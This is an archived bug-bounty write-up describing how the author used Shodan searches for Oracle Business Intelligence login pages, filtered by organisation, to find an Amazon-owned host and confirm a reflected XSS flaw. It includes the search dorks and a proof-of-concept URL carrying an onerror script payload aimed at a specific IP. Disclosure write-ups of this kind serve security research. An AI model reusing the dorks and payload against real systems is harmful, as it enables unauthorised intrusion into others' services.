---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-12-15_alternative-link.md
original_filename: 2021-12-15_alternative-link.md
title: Alternative link
category: documents
detected_topics:
- xss
- command-injection
- mfa
tags:
- imported
- documents
- xss
- command-injection
- mfa
language: en
raw_sha256: e0e9e35957695d40f27b0138d88a41365a2e5d400a292bbbe3650875adee1c7d
text_sha256: 18202d2db9972fca58ab06d8a455d24c8c251db653432dc8b0fa9492d9b4fdca
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Alternative link

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-12-15_alternative-link.md
- Source Type: markdown
- Detected Topics: xss, command-injection, mfa
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `e0e9e35957695d40f27b0138d88a41365a2e5d400a292bbbe3650875adee1c7d`
- Text SHA256: `18202d2db9972fca58ab06d8a455d24c8c251db653432dc8b0fa9492d9b4fdca`


## Content

---
title: "Alternative link"
page_title: "How I found XSS vulnerability in Amazon in 5 minutes using shodan - MoTaha"
url: "https://motaha22.github.io/bugbounty/bounty/"
final_url: "https://motaha22.github.io/bugbounty/bounty/"
authors: ["Mohamed Taha (@Mohamed12742780)"]
programs: ["Amazon"]
bugs: ["XSS"]
publication_date: "2021-12-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3088
---

# How I found XSS vulnerability in Amazon in 5 minutes using shodan 

__less than 1 minute read

#### __On this page

This is my first write-up. I was scrolling through twitter and I found this great tip:

![](/assets/images/crackmes/xss.png)

So I quickly went to shodan and write this dork:
  
  
  html:">Oracle Business Intelligence"
  

to find the websites that is vulnerable to this CVE with organizations names so the final dork was like this:
  
  
  html:">Oracle Business Intelligence" org:amazon
  

I found an IP which is owned by Amazon that is vulnerable to this CVE

the final POC is :

https://52.46.133.78/bi-security-login/login.jsp?msi=false&redirect=%22%3E%3Cimg/src/onerror%3dalert(document.domain)%3E

![](/assets/images/crackmes/xss2.png)

Thank you.

**__Categories:** [bugbounty](/categories/#bugbounty)

**__Updated:** March 2, 2022

[Previous](/bugbounty/2fa-bounty/ "How I earned $$$ by bypassing 2FA
") [Next](/bugbounty/ibm-bounty/ "How I was able to access IBM internal documents
")
